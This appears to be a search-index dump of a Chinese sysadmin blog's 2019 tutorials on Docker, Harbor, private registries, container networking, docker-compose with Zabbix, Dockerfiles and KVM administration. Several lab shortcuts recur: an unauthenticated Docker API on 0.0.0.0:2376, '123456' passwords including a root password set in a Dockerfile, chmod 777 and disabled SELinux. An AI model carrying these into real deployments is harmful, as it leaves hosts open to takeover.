#上传证书至此文件夹 mkdir /data/cert/ #两个文件 ls /data/cert/ myharbor.crt myharbor.key 4.生成配置文件 ./prepare 5.停止harbor docker-compose down -v 可以提前执行，太慢了。 6.开启harbor docker-compose up -d 7.测试 #正常登陆 docker login soulchild.cn #pull镜像也没有问题 docker pull soulchild.cn/soulchild/busybox:1.18 ","date":"2019-07-18 21:40","objectID":"/post/686/:0:0","tags":["docker"],"title":"给harbor私有仓库配置https","uri":"/post/686/"},{"categories":["虚拟化","docker"],"content":"1.删除旧版本 yum remove docker yum remove docker-common 2.安装docker源 curl -o /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 3.安装新版本 yum install -y docker-ce 4.配置文件变成了daemon.json.rpmsave,修改配置文件名称 mv /etc/docker/daemon.json{.rpmsave,} 5.启动服务 systemctl start docker systemctl enable docker 安装完后旧版本的容器还在。 ","date":"2019-07-18 01:35","objectID":"/post/678/:0:0","tags":["docker"],"title":"docker升级新版本yum方式","uri":"/post/678/"},{"categories":["虚拟化","docker"],"content":"docker版本要求：17.06.0 或更高 docker-compose版本要求：version 1.18.0或更高 在线安装： 下载地址：https://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-online-installer-v1.8.1.tgz wget https://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-online-installer-v1.8.1.tgz tar xf harbor-online-installer-v1.8.1.tgz cd harbor #修改主机名和管理员密码、数据库密码 vim harbor.yml hostname: 10.0.0.11 harbor_admin_password: 123456 database: password: 123456 #安装 ./install.sh #接下来就是漫长的等待 离线安装： 下载地址：https://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-offline-installer-v1.8.1.tgz tar xf harbor-offline-installer-v1.8.1.tgz cd harbor #主要修改三个地方，也可以根据自己需求修改egrep -v '^$|#' harbor.yml vim harbor.yml hostname: 10.0.0.12 harbor_admin_password: 123456 database: password: 123456 #安装 ./install.sh ","date":"2019-07-18 01:08","objectID":"/post/675/:0:0","tags":["docker"],"title":"docker私有仓库harbor1.8.1安装部署","uri":"/post/675/"},{"categories":["虚拟化","docker"],"content":"环境：三台centos7都有docker docker01：10.0.0.11 docker02：10.0.0.12 consul：10.0.0.13 1.部署consul -h：设置容器主机名 docker run -d -p 8500:8500 -h consul --name consul --restart=always progrium/consul -server -bootstrap 2.修改docker01和docker02配置文件 [root@docker01 ~]# cat /etc/docker/daemon.json { \"hosts\":[\"tcp://0.0.0.0:2376\",\"unix:///var/run/docker.sock\"], \"cluster-store\": \"consul://10.0.0.13:8500\", \"cluster-advertise\": \"10.0.0.11:2376\" } ############################################################################# [root@docker02 ~]# cat /etc/docker/daemon.json { \"hosts\":[\"tcp://0.0.0.0:2376\",\"unix:///var/run/docker.sock\"], \"cluster-store\": \"consul://10.0.0.13:8500\", \"cluster-advertise\": \"10.0.0.12:2376\" } 3.修改服务启动配置文件 vim /usr/lib/systemd/system/docker.service 将：ExecStart=/usr/bin/dockerd -H fd:// –containerd=/run/containerd/containerd.sock 修改为：ExecStart=/usr/bin/dockerd –containerd=/run/containerd/containerd.sock 修改完后重启docker systemctl daemon-reload systemctl restart docker 4.查看注册，已经存在两个docker节点了。 http://10.0.0.13:8500/ui/#/dc1/kv/docker/nodes/ \u003cimg src=“images/98caad0594d774cb54a50874bda42011.png “98caad0594d774cb54a50874bda42011\"” /\u003e 5.创建overlay网络 随便一台docker上执行，其他已注册的节点也会创建overlay网络 docker network create --driver overlay --subnet 172.16.1.0/24 --gateway 172.16.1.254 overlay_1 6.创建容器测试 docker run -it --network overlay_1 busybox 两台分别创建，互相可以ping通 ","date":"2019-07-17 22:35","objectID":"/post/670/:0:0","tags":["docker"],"title":"docker中overlay网络","uri":"/post/670/"},{"categories":["虚拟化","docker"],"content":"实现不同宿主机中的容器通信 1.创建macvlan网络 –driver 指定网络类型macvlan –subnet 指定一个网段(根据真实环境填写) –gateway 指定网关(根据真实环境填写) -o parent=eth0 指定宿主接口 macvlan_1 自定义的网络名称 docker network create --driver macvlan --subnet 10.0.0.0/24 --gateway 10.0.0.254 -o parent=eth0 macvlan_1 2.创建容器 docker01： docker run -it --network macvlan_1 --ip=10.0.0.1 busybox docker02： docker run -it --network macvlan_1 --ip=10.0.0.2 busybox 此时，两个容器可以互通，也都可以ping通外网，但是不能ping通自己的宿主机。 ","date":"2019-07-17 20:56","objectID":"/post/666/:0:0","tags":["docker"],"title":"docker中macvlan网络","uri":"/post/666/"},{"categories":["虚拟化","docker"],"content":"None：不使用网络。使用方式：–network=none Host：与宿主机公用网络。使用方式：–network=host Container：与其他容器公用网络。–network=container:\u003cname or id\u003e Bridge：桥接docker0网卡。–network=bridge ","date":"2019-07-17 20:33","objectID":"/post/663/:0:0","tags":["docker"],"title":"docker的四种网络类型","uri":"/post/663/"},{"categories":["虚拟化","docker"],"content":"启动新容器时 docker run –restart=always 修改已在使用的容器 docker update –restart=always ","date":"2019-07-17 19:24","objectID":"/post/661/:0:0","tags":["docker"],"title":"docker自动启动容器","uri":"/post/661/"},{"categories":["虚拟化","docker"],"content":"1.安装docker-compose, 方法1. 在epel源中直接yum安装 yum install -y docker-compose 方法2.使用pip安装 yum -y install python-pip pip install docker-compose 2.创建工作目录,编写docker-compose文件 mkdir /opt/myzabbix vim /opt/myzabbix/docker-compose.yaml yaml文件内容 version: '3' services: mysql-server: image: mysql:5.7 restart: always environment: MYSQL_ROOT_PASSWORD: root_pwd MYSQL_DATABASE: zabbix MYSQL_USER: zabbix MYSQL_PASSWORD: zabbix_pwd command: --character-set-server=utf8 zabbix-java-gateway: image: zabbix/zabbix-java-gateway:latest restart: always zabbix-server: depends_on: - mysql-server image: zabbix/zabbix-server-mysql:latest restart: always environment: DB_SERVER_HOST: mysql-server MYSQL_DATABASE: zabbix MYSQL_USER: zabbix MYSQL_PASSWORD: zabbix_pwd MYSQL_ROOT_PASSWORD: root_pwd ZBX_JAVAGATEWAY: zabbix-java-gateway ports: - \"10051:10051\" zabbix-web-nginx-mysql: depends_on: - zabbix-server image: zabbix/zabbix-web-nginx-mysql:latest ports: - \"80:80\" restart: always environment: DB_SERVER_HOST: mysql-server MYSQL_DATABASE: zabbix MYSQL_USER: zabbix MYSQL_PASSWORD: zabbix_pwd MYSQL_ROOT_PASSWORD: root_pwd 3.运行 cd /opt/myzabbix #创建并运行容器 docker-compose up ======================================================================= 其他docker-compose命令,需要在docker-compose.yaml文件同一目录下执行： 常用选项参数： -d：后台运行 -f：指定文件，默认是 docker-compose.yml -p：项目名称 --verbose：显示详细过程信息 更多参数可以使用docker-composer -h查看 常用命令： #构建并后台启动nignx容器 docker-compose up -d nginx #设置要为某个服务运行的容器数 docker-compose scale zabbix-web-nginx-mysql=3 #登录到指定容器中 docker-compose exec mysql-server bash #停止项目中所有容器 docker-compose stop #停止项目中指定容器 docker-compose stop mysql-server] #开启项目中所有容器 docker-compose start #开启项目中指定容器 docker-compose start mysql-server #重启项目中所有容器 docker-compose restart #重启指定容器 docker-compose restart mysql-server 暂停容器 docker-compose pause mysql-server 恢复容器 docker-compose unpause mysql-server #停止并删除所有容器和镜像 docker-compose down #显示所有容器 docker-compose ps #不依赖 启动容器，运行后删除容器 docker-compose run --no-deps --rm mysql-server #构建镜像 docker-compose build mysql-server 查看指定容器的日志 docker-compose logs mysql-server 查看指定容器的实时日志 docker-compose logs -f mysql-server #检查配置文件，没问题没有输出，有问题输出错误内容 docker-compose config -q 以json的形式输出nginx的docker日志 docker-compose events --json nginx ","date":"2019-07-17 18:12","objectID":"/post/651/:0:0","tags":["docker"],"title":"docker-compose安装和常用命令并部署zabbix示例","uri":"/post/651/"},{"categories":["虚拟化","docker"],"content":"1.生成认证文件 yum install -y httpd-tools mkdir -p /data/registry_auth/ htpasswd -Bbn test testpass \u003e\u003e /data/registry_auth/htpasswd 2.从官方pull镜像 docker pull registry 3.运行容器 –restart=always：重启docker，自动启动容器 –name=registry：设置容器名称 -v /data/myregistry:/var/lib/registry：将容器的/var/lib/registry目录挂载到本地的/data/myregistry -v /data/registry_auth/:/auth/：认证文件所在目录 docker run -d \\ -p5000:5000 \\ --restart=always \\ --name=registry \\ -v /data/myregistry/:/var/lib/registry \\ -v /data/registry_auth/:/auth/ \\ -e \"REGISTRY_AUTH=htpasswd\" \\ -e \"REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm\" \\ -e \"REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd\" \\ registry 下面是无认证的 docker run -d \\ -p5000:5000 \\ --restart=always \\ --name=registry \\ -v /data/myregistry/:/var/lib/registry \\ registry 4.登陆仓库 docker login 10.0.0.11:5000 5.上传镜像到私有仓库 1）打标签指定仓库地址 docker tag nginx:latest 10.0.0.11:5000/nginx:latest 上传镜像 docker push 10.0.0.11:5000/nginx:latest 上传之前需要先在/etc/docker/daemon.json中添加如下内容，添加完后重启docker “insecure-registries”:[“10.0.0.11:5000”] 6.下载镜像 docker pull 10.0.0.11:5000/nginx:latest 7.查看仓库中的镜像 #os查看镜像 ls /data/myregistry/docker/registry/v2/repositories/ #os查看标签 ls /data/myregistry/docker/registry/v2/repositories/镜像名称/_manifests/tags/ #http查看镜像 http://10.0.0.11:5000/v2/_catalog #http查看标签 http://10.0.0.11:5000/v2/镜像名称/tags/list 8.删除仓库中的镜像 1）删除nginx镜像目录 rm -fr /data/myregistry/docker/registry/v2/repositories/nginx/ 2）垃圾回收 docker exec -it registry registry garbage-collect /etc/docker/registry/config.yml ","date":"2019-07-17 13:46","objectID":"/post/642/:0:0","tags":["docker"],"title":"docker 部署私有仓库registry设置认证和一些常用仓库操作","uri":"/post/642/"},{"categories":["虚拟化","docker"],"content":"通过–link可以实现单向别名访问. 1.在docker01中创建容器1 # 创建一个容器命名为container1 docker run -d --name container1 busybox tail -f # 查一下ip是172.17.0.2 docker inspect container1 | grep -i ipaddr 2.在docker01中创建容器2 #可以多次使用 –link [name or id]:alias #创建第二台容器，链接容器1并设置别名c1 docker run -it --link container1:c1 busybox # ping测试 / # ping c1 PING c1 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.135 ms ^C --- c1 ping statistics --- 1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max = 0.135/0.135/0.135 ms / # ping container1 PING container1 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.118 ms 64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.158 ms ^C --- container1 ping statistics --- 2 packets transmitted, 2 packets received, 0% packet loss round-trip min/avg/max = 0.118/0.138/0.158 ms ","date":"2019-07-17 10:42","objectID":"/post/635/:0:0","tags":["docker"],"title":"docker中容器之间的通信之--link","uri":"/post/635/"},{"categories":["虚拟化","docker"],"content":"工作目录：/opt/dockerfile/centos6.9_kod/ 基于centos6.9制作一个kodexplorer的镜像 1.创建编辑dockerfile文件 #新版本的dockerfile文件名首字母不区分大小写，老版本中文件名必须是Dockerfile vim /opt/dockerfile/centos6.9_kod/dockerfile dockerfile内容如下： FROM centos:6.9 RUN curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo \u0026\u0026 \\ curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo \u0026\u0026 \\ yum install nginx php-fpm php-gd php-mbstring unzip -y COPY nginx.conf /etc/nginx/nginx.conf WORKDIR /data ADD kodexplorer4.40.zip /data/ RUN unzip kodexplorer4.40.zip \u0026\u0026 \\ chmod -R 777 /data/ EXPOSE 80 COPY init.sh /init.sh CMD [\"/bin/sh\",\"/init.sh\"] init.sh：用于启动服务使用 #!/bin/bash service php-fpm start nginx -g \"daemon off;\" nginx.conf：简单修改一下php部分 worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root /data; index index.php index.html index.htm; } location ~ \\.php$ { root /data; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /data$fastcgi_script_name; include fastcgi_params; } } } 构建镜像： -t：打一个标签 .：当前目录–\u003e/opt/dockerfile/centos6.9_kod/ docker build -t kod:v1 . 创建并运行容器： docker -d -p80:80 kod:v1 ","date":"2019-07-12 18:27","objectID":"/post/621/:0:0","tags":["docker"],"title":"使用dockerfile制作镜像","uri":"/post/621/"},{"categories":["虚拟化","docker"],"content":"dockerfile指令： FROM：指定基础镜像 #语法示例 FROM centos FROM centos:6.9 #不加tag标签，默认是latest MAINTAINER:(可选)维护者信息 #语法示例 MAINTAINER my name is soulchild. LABLE：(可选)标签、描述信息，可以写成多个LABLE，建议只写一个，可以使用\\符号 #语法示例 LABEL version=\"1.1\" \\ description=\"this is example\" RUN：构建镜像时执行的命令，每一个RUN都会生成一层镜像，可以使用\u0026\u0026和\\来解决多层臃肿的问题。 #语法示例 RUN yum install -y openssh-server \u0026\u0026 \\ service sshd start \u0026\u0026 \\ echo '123456' | passwd root --stdin ADD：将文件复制到镜像中，如果文件格式是tar包，会自动解压，还可以访问网络资源 #语法示例 ADD /root/test.tar.gz /opt/ ADD http://xxx.xxx.com/download/xx.zip /opt COPY：将文件复制到镜像中 #语法示例 COPY /root/kod.conf /etc/nginx/conf.d/kod.conf ENV：设置环境变量 #语法示例 #1.一次只能设置一个 ENV a 123 #2.一次可以设置多个，支持\\换行 ENV b=456 c=789 #运行容器时需要指定-e参数 WORKDIR：切换工作目录，相当于cd #语法示例 WORKDIR /opt EXPOSE：端口映射 #语法示例 EXPOSE 80 443 EXPOSE 22/tcp 23/udp #需要在容器运行时指定-P参数，才会将宿主机随机端口映射到容器发布的端口 VOLUME：设置卷，挂载目录 #语法示例 VOLUME /usr/share/nginx/html #启动容器时会自动生成一个卷，可以通过docker volume [command],查看卷的详细信息 CMD：容器启动后的初始命令，此参数只能出现一次。如果在运行容器时指定运行命令了，此参数无效，会被替换掉。 #格式： CMD [\"命令\",\"参数1\",\"参数2\"] #语法示例 CMD [\"/usr/sbin/sshd\",\"-D\"] ENTRYPOINT：启动容器时如果手动指定了一个命令，会被追加到最后当作参数而执行， #格式： ENTRYPOINT [\"命令\",\"参数1\",\"参数2\"] #语法示例 ENTRYPOINT [\"/bin/bash\",\"init.sh\"] #容器运行 docker run -d entrypoint:test hello 实际上运行的初始命令是/bin/bash init.sh hello ","date":"2019-07-12 16:38","objectID":"/post/617/:0:0","tags":["docker"],"title":"dockerfile指令详解","uri":"/post/617/"},{"categories":["虚拟化","docker"],"content":"1.首先选择底层镜像centos6.9 docker pull centos:6.9 2.运行容器 docker run -it -p80:80 --name kodexplorer centos:6.9 3.进入容器系统后的操作 #安装lnmp curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo yum install nginx php-fpm php-gd php-mbstring wget unzip -y cd /usr/share/nginx/html rm -f /usr/share/nginx/html/* wget http://static.kodcloud.com/update/download/kodexplorer4.40.zip rm -f kodexplorer4.40.zip #修改nginx配置文件，可参考下面的配置 vi /etc/nginx/conf.d/default.conf #修改权限 chmod -R 777 /usr/share/nginx/html/ #创建服务启动脚本 mkdir /server/ vim /server/init.sh setenforce 0 service php-fpm start nginx -g 'daemon off;' #删除无用软件,缩减镜像大小 yum remove unzip wget -y yum clean all 退出容器。 nginx配置文件： server { listen 80 default_server; listen [::]:80 default_server; server_name _; root /usr/share/nginx/html; index index.php # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / { } location ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } } 4.提交镜像 指定容器ID或名字：kodexplorer 给生成的镜像名字打标签：kodexplorer:v1 docker commit kodexplorer kodexplorer:v1 5.测试 docker run -d -p80:80 kodexplorer:v1 sh /server/init.sh ","date":"2019-07-11 17:49","objectID":"/post/613/:0:0","tags":["docker"],"title":"dcoker 手动制作kodexplorer镜像","uri":"/post/613/"},{"categories":["虚拟化","docker"],"content":"查看当前卷 docker volume ls 创建一个卷 docker volume create web_data 删除一个卷 docker volume rm web_data 查看这个卷的详细信息 docker volume inspect web_data 命令行参数 -v 宿主机目录或卷名称:容器目录 示例 docker run -d -p80:80 -v web_data:/usr/share/nginx/html nginx 注意： -v参数使用的是卷名时： 当web_data的挂载点中没有文件时，会自动将容器目录中的内容同步到web_data的挂载点。 当web_data的挂载点中有文件时，会自动将web_data的挂载点的内容同步到容器目录中。 -v参数使用的是目录时： 容器内的内容会被清空 ","date":"2019-07-11 16:05","objectID":"/post/611/:0:0","tags":["docker"],"title":"docker volume挂载数据卷,实现数据持久化","uri":"/post/611/"},{"categories":["虚拟化","docker"],"content":"查询镜像 docker search nginx ","date":"2019-07-11 15:50","objectID":"/post/602/:0:1","tags":["docker"],"title":"docker常用命令和参数说明","uri":"/post/602/"},{"categories":["虚拟化","docker"],"content":"拉取镜像 docker pull nginx:1.17.1 ","date":"2019-07-11 15:50","objectID":"/post/602/:0:2","tags":["docker"],"title":"docker常用命令和参数说明","uri":"/post/602/"},{"categories":["虚拟化","docker"],"content":"查询本地镜像 #查询所有镜像 docker images #查询所有镜像，包含中间层 docker images -a #查询指定镜像 docker images nginx ","date":"2019-07-11 15:50","objectID":"/post/602/:0:3","tags":["docker"],"title":"docker常用命令和参数说明","uri":"/post/602/"},{"categories":["虚拟化","docker"],"content":"删除镜像 docker image rm nginx:1.17.1 ","date":"2019-07-11 15:50","objectID":"/post/602/:0:4","tags":["docker"],"title":"docker常用命令和参数说明","uri":"/post/602/"},{"categories":["虚拟化","docker"],"content":"导入、导出(通过load、save) #导入镜像,-i:指定镜像文件 docker image load -i docker_nginx1.17.1.tar.gz #导出镜像,-o:输出的文件名称路径 docker image save -o docker_nginx1.17.1.tar.gz nginx:1.17.1 #导出镜像,重定向方式 docker image save nginx:1.17.1 \u003e docker_nginx1.17.1.tar.gz ","date":"2019-07-11 15:50","objectID":"/post/602/:0:5","tags":["docker"],"title":"docker常用命令和参数说明","uri":"/post/602/"},{"categories":["虚拟化","docker"],"content":"导入、导出(通过export、import) 和上面的类似，但是通过export可以直接导出容器，但需要使用import导入 #导入镜像,-i:指定镜像文件 docker import docker_nginx1.17.1.tar.gz nginx:1.17.1 #导出容器为镜像,-o:输出的文件名称路径 docker export -o docker_nginx.tar.gz 容器ID ","date":"2019-07-11 15:50","objectID":"/post/602/:0:6","tags":["docker"],"title":"docker常用命令和参数说明","uri":"/post/602/"},{"categories":["虚拟化","docker"],"content":"创建并运行容器 -i : 保持打开stdin -t : 分配一个TTY终端 通常-it一起使用 -d : 后台运行，并显示容器ID -p 主机端口:容器端口 -p IP:主机端口:容器端口(分配一个IP做映射 ) -p IP::容器端口(随机端口) -p 主机端口:容器端口:udp -p IP::53:udp（分配一个IP，随机的端口映射到容器53端口，使用udp） -p 81:80 –p 443:443 可以指定多个-p -P：随机端口映射，可以和dockerfile中的EXPOSE配合使用 –name：指定容器名称 -h：指定容器主机名 -v：将本地目录挂载到容器中,实现数据持久化 docker run -d -p80:80 --name web -v /opt/www:/usr/share/nginx/html nginx:latest ","date":"2019-07-11 15:50","objectID":"/post/602/:0:7","tags":["docker"],"title":"docker常用命令和参数说明","uri":"/post/602/"},{"categories":["虚拟化","docker"],"content":"查看容器 -a：查看所有容器，默认不显示已退出的容器 -q：只显示容器ID -l：查看最近一次创建的容器 –no-trunc：显示完整信息 docker ps -a ","date":"2019-07-11 15:50","objectID":"/post/602/:0:8","tags":["docker"],"title":"docker常用命令和参数说明","uri":"/post/602/"},{"categories":["虚拟化","docker"],"content":"进入容器 #独立终端连接容器 docker exec -it 容器ID或名字 /bin/bash #需要已经运行bash环境，使用同一个终端，终端的内容会同步进行。可以通过ctrl + p，ctrl + q退出。 docker attach 容器ID或名字 删除容器 docker rm 容器ID或名字 批量删除容器 -f:强制删除 docker rm $(docker ps -a -q) 宿主机和容器之间的文件复制 docker cp nostalgic_goldberg:/etc/nginx/conf.d/default.conf /opt/ ","date":"2019-07-11 15:50","objectID":"/post/602/:0:9","tags":["docker"],"title":"docker常用命令和参数说明","uri":"/post/602/"},{"categories":["基础内容"],"content":"网络配置的两种方式 图形界面方内式(network-manager)和修改/etc/network/interfaces 但是如果两容种方式的网络设置不同，就会产生冲突，即：network-manager与/etc/network/interfaces文件冲突,就会导致识别不了IP。 ","date":"2019-07-09 16:49","objectID":"/post/1931/:0:0","tags":[],"title":"network-manager与interfaces为什么会冲突","uri":"/post/1931/"},{"categories":["虚拟化","docker"],"content":"中科大：https://docker.mirrors.ustc.edu.cn 网易：http://hub-mirror.c.163.com 官方：https://registry.docker-cn.com 1.新版本： vim /etc/docker/daemon.json { \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn\"] } 2.老版本：每个配置项用空格分开 vim /etc/sysconfig/docker DOCKER_OPTS=\"--registry-mirror=https://docker.mirrors.ustc.edu.cn\" 3配置仓库信任 新版：每个配置项用逗号分开 vim /etc/docker/daemon.json { \"insecure-registries\":[\"192.168.1.90\"] } 老版：每个配置项用空格分开 vim /etc/sysconfig/docker DOCKER_OPTS=\"--insecure-registries 192.168.1.90\" 4.重启docker服务 systemctl reload docker ","date":"2019-07-09 16:10","objectID":"/post/604/:0:0","tags":["docker"],"title":"docker配置国内镜像加速和信任仓库","uri":"/post/604/"},{"categories":["虚拟化","docker"],"content":"docker-ce: docker社区版 docker-ee: docker企业版 1.配置docker-ce yum源 curl -o /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 2.安装docker-ce yum install -y docker-ce 3.设置开机自启并启动docker systemctl enable docker systemctl start docker","date":"2019-07-09 11:14","objectID":"/post/597/:0:0","tags":["docker"],"title":"yum安装docker","uri":"/post/597/"},{"categories":["基础内容"],"content":"主要参数： net.ifnames=0 biosdevname=0 1.修改网卡名称 vim /etc/sysconfig/network-scripts/ifcfg-ens33 删除UUID，mac地址。修改下面两个参数为新的网卡名： NAME=eth0 DEVICE=eth0 2.修改网卡配置文件名称 mv /etc/sysconfig/network-scripts/ifcfg-{ens33,eth0} 3.修改grub文件中GRUB_CMDLINE_LINUX vim /etc/default/grub net.ifnames=0 biosdevname=0 \u003cimg src=“images/6d110be13a8ba3e2efce934cfecedbb7.png “6d110be13a8ba3e2efce934cfecedbb7\"” /\u003e 4.更新grub grub2-mkconfig -o /boot/grub2/grub.cfg 然后重启系统就可以了 ","date":"2019-07-09 11:03","objectID":"/post/599/:0:0","tags":[],"title":"centos7修改网卡名","uri":"/post/599/"},{"categories":["虚拟化"],"content":"环境： KVM01：安装kvm、nfs、/opt/目录为磁盘文件目录 KVM02：安装kvm、nfs host解析： 10.0.0.11 kvm01 10.0.0.12 kvm02 1.安装nfs(两台KVM都装) yum install -y nfs-utils #服务端安装rpcbind yum install -y rpcbind 2.kvm01配置nfs [root@kvm01 ~]# vim /etc/exports #共享目录写虚拟磁盘文件目录 /opt 10.0.0.0/24(rw,rsync,no_root_squash) [root@kvm01 ~]# systemctl start rpcbind [root@kvm01 ~]# systemctl start nfs 3.KVM02挂载目录 #注意挂载的目录要和原来的一致，否则会找不到磁盘文件 [root@kvm02 ~]# mount -t nfs 10.0.0.11:/opt /opt/ 4.开始迁移 #查看当前虚拟机状态 [root@kvm01 ~]# virsh list Id Name State ---------------------------------------------------- 16 centos7 running –live 实时迁移 –verbose 显示进度 –unsafe 忽略安全 #迁移 virsh migrate --live --verbose centos7 qemu+ssh://10.0.0.12/system --unsafe ","date":"2019-07-07 01:41","objectID":"/post/589/:0:0","tags":["KVM","虚拟化"],"title":"KVM利用nfs热迁移","uri":"/post/589/"},{"categories":["虚拟化"],"content":"一、添加 virsh setvcpus we01-clone 4 二、通过配置文件添加 #关机 virsh shutdown web01-clone #编辑配置文件 virsh edit web01-clone \u003cvcpu placement=‘static’ current=‘2’\u003e4\u003c/vcpu\u003e #current:当前cpu数量 #4：最大数量限制 #开机 virsh start web01-clone 查看： #查看物理CPU个数 cat /proc/cpuinfo| grep \"physical id\"| wc -l #查看每个物理CPU的核心数 cat /proc/cpuinfo| grep \"cpu cores\"| uniq #查看逻辑cpu个数 lscpu | grep 'CPU(s):' | head -n 1 ","date":"2019-07-06 21:34","objectID":"/post/586/:0:0","tags":["KVM","虚拟化"],"title":"KVM热添加CPU和配置文件修改cpu","uri":"/post/586/"},{"categories":["虚拟化"],"content":"添加内存 立即生效，临时的。 virsh setmem web01-clone 1024M –config 不会立即不生效，在下一次启动生效 virsh setmem web01-clone 1024M --config 修改最大内存限制 #关机 virsh shutdown web01-clone #修改最大内存 virsh setmaxmem web01-clone 2048M #查看结果 virsh dominfo web01-clone | grep -i max ","date":"2019-07-06 20:49","objectID":"/post/584/:0:0","tags":["KVM","虚拟化"],"title":"KVM热添加内存和修改最大内存限制","uri":"/post/584/"},{"categories":["虚拟化"],"content":"1.创建网卡 –type 网卡类型 –source 宿主机的网卡 –model 驱动模式 –persistent 保存至配置文件 virsh attach-interface web01-clone --type bridge --source br0 --model virtio --persistent 查看接口信息： virsh domiflist web01-clone 删除网卡： virsh detach-interface web01-clone --type bridge --mac 52:54:00:e9:8f:43 --persistent ","date":"2019-07-06 20:15","objectID":"/post/578/:0:0","tags":["KVM","虚拟化"],"title":"KVM热添加网卡","uri":"/post/578/"},{"categories":["虚拟化"],"content":"一、热添加 1.创建一块硬盘 qemu-img create -f qcow2 /data/web01-clone-add01.qcow2 1G 2.添加硬盘到虚拟机 指定主机名称 指定磁盘文件 指定目标设备 –subdriver 指定磁盘文件类型 –persistent 同时保存至配置文件(不加次参数为临时修改) virsh attach-disk web01-clone /data/web01-clone-add01.qcow2 vdb --subdriver=qcow2 --persistent 移除硬盘可以使用 virsh detach-disk web01-clone vdb --persistent 3.查看 进系统查看或者在宿主机中查看 宿主机： virsh domblklist web01-clone 进系统： fdisk -l 二、扩容已有硬盘 1.卸载硬盘(虚拟机操作) umount /dev/vdb 2.移除硬盘(宿主机操作) virsh detach-disk web01-clone vdb 3.扩容(+nG代表增加nG容量，不写+号代表扩容至nG) qemu-img resize /data/web01-clone-add01.qcow2 +1G 4.添加硬盘至虚拟机 virsh attach-disk web01-clone /data/web01-clone-add01.qcow2 vdb --subdriver qcow2 5.进入虚拟机系统，重新挂载 mount /dev/vdb /mnt # ext文件系统 resize2fs /dev/vdb #xfs文件系统 xfs_growfs /dev/vdb 此时df -Th查看硬盘容量已经扩容成功 ","date":"2019-07-04 23:49","objectID":"/post/573/:0:0","tags":["KVM","虚拟化"],"title":"KVM热添加硬盘和扩容现有硬盘","uri":"/post/573/"},{"categories":["虚拟化"],"content":"1.查看虚拟网卡 brctl show 2.创建网桥 virsh iface-bridge eth0 br0 取消时可以使用 virsh iface-unbridge br0 3.关机修改配置文件 virsh shutdown web01-clone-2 virsh edit web01-clone-2 修改为如下参数： \u003cinterface type=‘bridge’\u003e \u003csource bridge=‘br0’/\u003e 4.开机 virsh start web01-clone-2 ","date":"2019-07-04 22:43","objectID":"/post/571/:0:0","tags":["KVM","虚拟化"],"title":"KVM虚拟机修改网卡为桥接网络","uri":"/post/571/"},{"categories":["虚拟化"],"content":"1.完整克隆 –auto-clone 从原始客户机配置中自动生成克隆名称和存储路径。 -o 原始虚拟机(该虚拟机需要在挂起和关机的状态) -n 新的虚拟机名称 virt-clone --auto-clone -o web01 -n web01-clone 2.链接克隆 1.创建一个链接磁盘 -f 指定磁盘文件格式类型 -b 执行链接磁盘文件路径 qemu-img create -f qcow2 -b /data/web01.qcow2 /data/web01-clone-2.qcow2 2.查看链接磁盘的信息： [root@kvm01 ~]# qemu-img info /data/web01-clone-2.qcow2 image: /data/web01-clone-2.qcow2 file format: qcow2 virtual size: 10G (10737418240 bytes) disk size: 196K cluster_size: 65536 backing file: /data/web01.qcow2 Format specific information: compat: 1.1 lazy refcounts: false 3.导出母机的配置文件，并修改磁盘文件路径 virsh dumpxml web01 \u003e /etc/libvirt/qemu/web01-clone-2.xml 修改后的内容，UUID和mac地址需要手动删除 egrep 'qcow2|name\u003e' /etc/libvirt/qemu/web01-clone-2.xml \u003cname\u003eweb01-clone-2\u003c/name\u003e \u003cdriver name='qemu' type='qcow2'/\u003e \u003csource file='/data/web01-clone-2.qcow2'/\u003e 4.导入、开机 virsh define /etc/libvirt/qemu/web01-clone-2.xml virsh start web01-clone-2 5.连接、测试 #查看配置文件，检查qcow2磁盘路径，还有原始磁盘文件 virsh dumpxml web01-clone-2 | grep -C 2 qcow2 #查看端口号，使用vnc连接 virsh vncdisplay web01-clone-2 ","date":"2019-07-04 20:05","objectID":"/post/564/:0:0","tags":["KVM","虚拟化"],"title":"KVM完整克隆和链接克隆","uri":"/post/564/"},{"categories":["虚拟化"],"content":"快照目录：/var/lib/libvert/qemu/snapshot/ 1.查看快照 virsh snapshot-list web01 2.创建快照 –name 指定快照名称 virsh snapshot-create-as --name \"initial system\" web01 3.恢复快照 –snapshotname 快照名称 virsh snapshot-revert web01 --snapshotname 'initial system' 4.删除快照 –snapshotname 快照名称 virsh snapshot-delete web01 --snapshotname 'initial system' 5.查看快照信息 virsh snapshot-info web01 --snapshotname 'init system' ","date":"2019-06-29 11:05","objectID":"/post/561/:0:0","tags":["KVM","虚拟化"],"title":"KVM快照管理常用命令","uri":"/post/561/"},{"categories":["虚拟化"],"content":"磁盘格式说明： raw： 裸格式，占用空间比较大，不支持快照功能，性能较好，不方便传输。总50G,使用2G,实际占用宿主机空间50G qcow2：cow （copy on 